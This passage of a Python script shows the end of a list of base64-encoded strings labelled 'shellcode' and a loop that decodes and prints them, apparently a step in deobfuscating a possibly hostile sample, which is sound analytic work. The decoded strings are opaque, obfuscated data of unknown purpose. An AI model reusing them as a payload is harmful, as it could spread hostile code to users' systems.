IiR7WsKHwrBqL8OlwrHCisKWWsKZwo3ChsO9wqdbw4nCucKHbhJBw5ZYA8KOwr7DnxrDqMOhw7omC3gUwpp6WX8dCMOSNx3Dj8Kzwq5Kw5jDmcKpa8KUw4xKGGsdVsKQwq/DgMKdJ0QPwqfDnsOXwpXDvMOxw5NLZsOlwptrd8OJwpzDkMOowp08wpg7QQ83w67DvgLCgmt1woNRwqPCh8O+w4XDp8KAR8OXGcKoEcOvw6HCnDBxSgfDjEB3OX5Iw7PDkQhqw4jDg8OeaSBjEcO7wrMFZDzDiMKCWVzDjMO2ZsO7w4UkGcKobx5cbhhsZcOLWAjCuMK+w4HDkSPDjsOFw6rDmlx6DDzCjl/DkcOgw73DgVbDscOqcTXCgcKWwpHCrsKEEjnCpEbCocK7b8KJwrLDp8K5w73DtsKVwogjwoHCrQvDkGdxEcKHw4vCgQMUH1ZJMMOzCsO0PsKjwoASw7NFfMODwpzCmMOVZkHDmA/DgFUVw55tdzdeXsOEwpAy','HgjCscObXA==','wqQSXsKUwp4=','UH0TCSnCksOaXyXDnsOw','w7R1wo3CgFs=','woRRB8KAw7A=','BBPCr8OH','w73CscODw6Iy','U8OUdWjCo8OKw6rDs8OxwobCtmQ=','bATDs8KZwpo=','wofCpkPCksKP','FFfCu2PCtDM4Pg/CgsK1w5sCwoTClsOGOsOPLncBFzUSw7oVTcKB','w5BzPmrChQ==','QMK3w5DDhsOc','wpBywr7DmHQ=','cmp2w6zDjQ==','KcKjwrHDjMOe','wqZfAMOkw78=','woDDucKYwp/CmQ==','asKfw5fDgcOe','UMKXw6vCnXk=','w7rCjMKLRMKw','w6/DmX3DlRw=','CwjCjcO5AA==','ZE5qw6XDkw==','YArDuMKEwrfCtMKR','wrzDjMK3wpTDngFv','DQ/Cp8OoJcKRQA==']

result=[]

for i in shellcode:
    temp=b64decode(i)
    result.append(temp)

print(result)